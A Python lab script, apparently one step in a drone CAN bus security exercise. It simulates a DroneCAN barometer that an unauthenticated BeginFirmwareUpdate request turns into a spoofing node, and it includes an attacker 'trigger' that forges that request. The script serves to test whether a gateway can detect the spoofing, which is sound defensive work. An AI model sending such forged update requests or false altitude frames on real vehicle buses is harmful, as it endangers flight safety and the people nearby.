#!/usr/bin/env python3
"""Node 5 (the compromised sensor): honest barometer -> OTA-trojaned masquerade.

This is the "firmware exploitation / unauthenticated bootloader" vector from
the threat model, demonstrated at message level on the lab bus:

  serve    runs as a NORMAL DroneCAN barometer node (same ID/cadence/payload as
           01_make_traffic.py's baro). It watches the bus for a
           uavcan.protocol.file.BeginFirmwareUpdate service request. On receipt
           it enters "bootloader" (emits NodeStatus MODE_SOFTWARE_UPDATE, per
           the DSDL's requirement), "flashes" for --flash-secs, reboots - and
           comes back as a masquerade node: identical ID, identical 50 Hz
           cadence, periodic +--jump m altitude lies (07_masquerade takeover).
  trigger  one-shot attacker command: sends the BeginFirmwareUpdate request to
           the node. From then on every forged frame is indistinguishable from
           honest traffic by ID/DLC/rate - only payload cross-checks can tell.

Frame layouts verified against pydronecan (dronecan/transport.py):
  CAN ID  = (prio << 24) | (service << 7) | source
            service frames add: (service_type << 16) | (request << 15) | (dest << 8)
  tail    = SOT(0x80) | EOT(0x40) | toggle(0x20) | transfer-id(0x1F)
BeginFirmwareUpdate = service type 40 (uavcan/protocol/file/40.*.uavcan),
payload: uint8 source_node_id + Path (we keep the path 2 chars to stay
single-frame; real update paths go multi-frame).

Evidence run (3 terminals):
  T1  python 10_trojan_node.py serve
  T2  python gateway_bridge.py --rules-only | tee ota_trojan_failure.log
  T3  python 10_trojan_node.py trigger          # a few seconds after T1
  -> T2 forwards every frame before AND after the compromise; only T1's
     [TROJAN] lines reveal that the "sensor" is now lying.
"""
import argparse
import math
import struct
import time

import can

BARO_ID = 0x10040405          # prio 16 | type 1028 StaticPressure | node 5
NODE_STATUS_TYPE = 341
SEA_LEVEL_PA = 101325.0
SERVICE_BEGIN_FIRMWARE_UPDATE = 40
MODE_SOFTWARE_UPDATE = 3      # uavcan.protocol.NodeStatus mode field (v0)


def alt_to_pa(alt_m: float) -> float:
    return SEA_LEVEL_PA * (1.0 - alt_m / 44330.0) ** 5.255


def ota_request_id(dest: int, source: int, prio: int = 16) -> int:
    """CAN ID of a BeginFirmwareUpdate REQUEST from `source` to `dest`."""
    return ((prio & 0x1F) << 24) | (1 << 7) | (source & 0x7F) \
        | (SERVICE_BEGIN_FIRMWARE_UPDATE << 16) | (1 << 15) | ((dest & 0x7F) << 8)


def baro_frame(pressure_pa: float, variance: int = 4, tid: int = 0) -> can.Message:
    return can.Message(arbitration_id=BARO_ID,
                       data=struct.pack("<fH", pressure_pa, variance) + bytes([0xC0 | (tid & 0x1F)]),
                       is_extended_id=True)


def node_status_frame(node: int, uptime: int, tid: int = 0) -> can.Message:
    """NodeStatus: uptime u32 + health<<6|mode<<3|sub u8 + vendor_status u16.

    Emitted with MODE_SOFTWARE_UPDATE while 'in the bootloader'."""
    mode_byte = (0 << 6) | (MODE_SOFTWARE_UPDATE << 3) | 0  # health=OK, sub=0
    cid = (16 << 24) | (NODE_STATUS_TYPE << 8) | (node & 0x7F)
    return can.Message(arbitration_id=cid,
                       data=struct.pack("<IBH", uptime, mode_byte, 0) + bytes([0xC0 | (tid & 0x1F)]),
                       is_extended_id=True)


def serve(args, bus):
    ota_id = ota_request_id(args.node, args.source)
    print(f"[NODE] barometer node {args.node} online - honest firmware 1.0.0, 50 Hz. "
          f"OTA watch: 0x{ota_id:08X}")

    t0 = time.time()
    next_due = t0
    n = tid = 0
    trojan = False
    while True:
        msg = bus.recv(timeout=0.002)
        if (msg is not None and msg.is_extended_id
                and msg.arbitration_id == ota_id and not trojan):
            src = msg.arbitration_id & 0x7F
            path = bytes(msg.data[1:-1]).decode("ascii", "replace")  # skip uint8 src + tail
            print(f"[NODE] *** OTA REQUEST: uavcan.protocol.file.BeginFirmwareUpdate "
                  f"(svc 40, src={src}, path='{path}') - bootloader accepts (no signature check!)")

            # -- 'bootloader': NodeStatus MODE_SOFTWARE_UPDATE per the DSDL --
            boot_end = time.time() + args.flash_secs
            while time.time() < boot_end:
                bus.send(node_status_frame(args.node, int(time.time() - t0), tid=tid))
                tid = (tid + 1) & 0x1F
                time.sleep(0.25)
            print(f"[NODE] flashed 6.6.6 - rebooting as TROJAN. Same ID, same 50 Hz cadence.")

            trojan = True
            next_due = time.time()  # resume cadence immediately after 'reboot'

        now = time.time()
        if now >= next_due:
            t = now - t0
            alt = 2.0 * math.sin(t / 7.0)               # same gentle wobble as always
            if trojan and n % args.spike_every == args.spike_every - 1:
                alt += args.jump
                print(f"[TROJAN] frame#{n} t={t:6.2f}s claims +{args.jump:.0f} m in one 20 ms step "
                      f"({alt_to_pa(alt):.0f} Pa) - RPM/speed/GPS still flat")
            bus.send(baro_frame(alt_to_pa(alt), tid=tid))
            tid = (tid + 1) & 0x1F
            n += 1
            next_due += 0.02


def trigger(args, bus):
    cid = ota_request_id(args.node, args.source)
    path = args.path.encode()[:6]  # keep single-frame: 1 (src) + len(path) <= 7 payload bytes
    data = bytes([args.source & 0x7F]) + path + bytes([0xC0])  # uint8 src + Path + tail(tid=0)
    print(f"[ATTACKER] BeginFirmwareUpdate -> node {args.node}: "
          f"id=0x{cid:08X} data={data.hex().upper()}")
    for _ in range(3):  # a few repeats, like a real initiator retry
        bus.send(can.Message(arbitration_id=cid, data=data, is_extended_id=True))
        time.sleep(0.1)
    print("[ATTACKER] request sent - watch the node flip.")


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("role", choices=["serve", "trigger"])
    ap.add_argument("--node", type=int, default=5, help="baro node id (target)")
    ap.add_argument("--source", type=int, default=99,
                    help="trigger: attacker node id / serve: expected source")
    ap.add_argument("--path", default="/f", help="trigger: firmware path (short = single-frame)")
    ap.add_argument("--jump", type=float, default=500.0, help="trojan: altitude lie per spike (m)")
    ap.add_argument("--spike-every", type=int, default=50, help="trojan: lie every N frames (1 Hz)")
    ap.add_argument("--flash-secs", type=float, default=2.0, help="seconds 'in the bootloader'")
    ap.add_argument("--channel", default="vcan0")
    args = ap.parse_args()

    bus = can.interface.Bus(channel=args.channel, interface="socketcan")
    if args.role == "serve":
        serve(args, bus)
    else:
        trigger(args, bus)


if __name__ == "__main__":
    main()
